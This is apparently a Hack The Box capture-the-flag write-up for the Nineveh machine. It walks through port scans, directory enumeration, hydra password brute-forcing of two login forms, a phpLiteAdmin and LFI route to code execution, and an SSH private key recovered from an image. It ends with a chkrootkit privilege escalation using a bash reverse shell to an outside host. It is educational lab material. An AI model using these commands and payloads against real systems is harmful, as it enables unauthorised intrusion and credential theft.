# Nineveh

This is the writeup for Nineveh from Hack The Box.

First we execute a full port scan on the host.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]                                                                                                                                                                      
└─$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.10.43                                                                                                                                            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

PORT    STATE SERVICE                                                                                                                                                                                             
80/tcp  open  http                                                                                                                                                                                                
443/tcp open  https
```

We executed a port scan on open ports.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]                                                                                                                                                                      
└─$ sudo nmap -vv -A -Pn -p 80,443 -oA nmap/nineveh 10.10.10.43                                                                                                                                                   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.                                                                                                                    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 13:55 -04
...
...
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html). 
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html). 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d18294b802107992bf01e802b26f8639
| SHA-1: 2275b03e27bd1226fdaa8b0f6de984f0113b42c0
```

We got the domain name of the host and write it down in our local hosts file.

Accessing the home page on the port 80 we got the following.

![Untitled](images/Untitled.png)

Accessing the service HTTPS on port 443 we got.

![Untitled](images/Untitled%201.png)

## Enumeration

We execute a brute-force directory on the host.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]
└─$ gobuster dir -k -e -u "https://nineveh.htb/" -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" -t 40 -x txt,php -o gobuster/nineveh_root
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/20 16:13:35 Starting gobuster in directory enumeration mode
===============================================================
https://nineveh.htb/db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
https://nineveh.htb/server-status        (Status: 403) [Size: 300]
https://nineveh.htb/.php                 (Status: 403) [Size: 291]
```

We executed a brute-force directory on HTTP service running on port 80.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]
└─$ gobuster dir -e -u "http://nineveh.htb/" -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x php -o gobuster/nineveh_http_root
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/20 16:48:53 Starting gobuster in directory enumeration mode
===============================================================
http://nineveh.htb/info.php             (Status: 200) [Size: 83685]
http://nineveh.htb/server-status        (Status: 403) [Size: 299]
http://nineveh.htb/.php                 (Status: 403) [Size: 290]
http://nineveh.htb/department           (Status: 301) [Size: 315] [--> http://nineveh.htb/department/]
```

Accessing the [`http://nineveh.htb/department/`](http://nineveh.htb/department/) we got.

![Untitled](images/Untitled%202.png)

Testing some users and passwords, we were able to enumerate that the admin user exists on the system.

![Untitled](images/Untitled%203.png)

![Untitled](images/Untitled%204.png)

We enumerated the subdomains in order to get more hosts but we weren´t able to do it.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]
└─$ gobuster vhost -k -u "https://nineveh.htb/" -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt" -t 40 -o gobuster/nineveh_vhosts     
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://nineveh.htb/
[+] Method:          GET
[+] Threads:         40
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
2023/02/20 16:32:02 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 114333 / 114442 (99.90%)
===============================================================
2023/02/20 16:39:34 Finished
===============================================================
```

We executed a brute-force password attack on both login pages. On HTTPS we got.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-20 17:20:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[STATUS] 672.00 tries/min, 672 tries in 00:01h, 14343727 to do in 355:45h, 16 active
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-20 17:23:01
```

And on HTTP form we got.

```bash
┌──(th3g3ntl3m4n㉿kali)-[~/htb/oscp/nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password"                      
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-20 17:28:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid Password
[STATUS] 1195.00 tries/min, 1195 tries in 00:01h, 14343204 to do in 200:03h, 16 active
[STATUS] 1200.00 tries/min, 3600 tries in 00:03h, 14340799 to do in 199:11h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-20 17:31:56
```

| **USER** | **PASSWORD** | **SERVICE** |
| --- | --- | --- |
| admin | password123 | HTTPS |
| admin | 1q2w3e4r5t | HTTP |

## Exploitation

Searching for some exploit we found this [https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044).  First, we create a new database named `jpfdevs.php`. 

![Untitled](images/Untitled%205.png)

Then we create a new table called `pleaseSub`.

![Untitled](images/Untitled%206.png)

And finally, we create our payload and insert it into the table.

![Untitled](images/Untitled%207.png)

In order to trigger our malicious file, we have to find a way to access our file on the browser. Checking the other service running HTTP port we were able to log into the system.

![Untitled](images/Untitled%208.png)

Then we navigate to notes menu. We noticed that there is a parameter on URL where we could trigger a LFI error.

![Untitled](images/Untitled%209.png)

We were able to trigger the error by removing the extension of the file (.txt) and we got.

![Untitled](images/Untitled%2010.png)

After some searches on `hacktricks` site, we were able to get access to the `/etc/passwd` file.

![Untitled](images/Untitled%2011.png)

Now we access our malicious file created on the HTTPS server and we were able to get Remote Command Execution (RCE).

![Untitled](images/Untitled%2012.png)

Running this payload, encoded on URL encode, we got our reverse shell on the victim host.

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

## Lateral Movement

Searching in amrois’ mail directory, we were able to read his emails received.

![Untitled](images/Untitled%2015.png)

This is a port knocking lead. Checking the file `knockd.conf` we got

![Untitled](images/Untitled%2016.png)

Here we can see we are able to open the SSH service (port 22) if we knock the correct port sequence, like in the email we’ve found. We ran the following part of script and we were able to log into SSH remotelly.

```bash

```

Searching around the host, we have found a directory on `/var/www/ssl/secure_notes` and running a `strings` command on the image file `nineveh.png` and we found a private key SSH.

```bash
-----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                                   
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI                                                                                                                                                  
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU                                                                                                                                                  
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5                                                                                                                                                  
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI                                                                                                                                                  
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT                                                                                                                                                  
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn                                                                                                                                                  
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk                                                                                                                                                  
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z                                                                                                                                                  
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR                                                                                                                                                  
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo                                                                                                                                                  
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu                                                                                                                                                  
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb                                                                                                                                                  
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl                                                                                                                                                  
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b                                                                                                                                                  
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx                                                                                                                                                  
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89                                                                                                                                                  
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC                                                                                                                                                  
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i                                                                                                                                                  
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG 
-----END RSA PRIVATE KEY-----

secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

We don’t have access to SSH service remotely, then we will execute SSH on the local host.

```bash
(remote) www-data@nineveh:/tmp$ ssh -i priv.key amrois@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

287 packages can be updated.
206 updates are security updates.

You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```

## Privilege Escalation

We upload the tool pspy64 in order to monitoring possible processes that are running as root.

![Untitled](images/Untitled%2017.png)

Searching for some public exploit using `searchsploit` we got the following.

```bash
╭─[us-vip-21]-[10.10.14.14]-[th3g3ntl3m4n@pentester]-[~/htb/oscp/nineveh]
╰─ $ searchsploit chkrootkit      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                            | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                    | linux/local/33899.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The intended behavior is to set `$file_port` to be equal to `"$file_port $i"` . But because the `""` is missing, `bash` will treat that as setting `file_port=$file_port` and then running `$i`

We write our reverse shell in the file update in folder tmp.

```bash
amrois@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.14/443 0>&1' > update
amrois@nineveh:/tmp$ chmod +x update
```

Waiting for `chkrootkit` to run again we were able to get our reverse shell.

```bash
╭─[us-vip-21]-[10.10.14.14]-[th3g3ntl3m4n@pentester]-[~/htb/oscp/nineveh]
╰─ $ python3 -m pwncat -lp 443
/home/th3g3ntl3m4n/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[16:44:22] Welcome to pwncat 🐈!                                                                                                                                                                   __main__.py:164
[16:47:03] received connection from 10.10.10.43:42682                                                                                                                                                   bind.py:84
[16:47:05] 0.0.0.0:443: normalizing shell path                                                                                                                                                      manager.py:957
[16:47:07] 10.10.10.43:42682: registered new host w/ db                                                                                                                                             manager.py:957
(local) pwncat$ back
(remote) root@nineveh:/root# id
uid=0(root) gid=0(root) groups=0(root)
```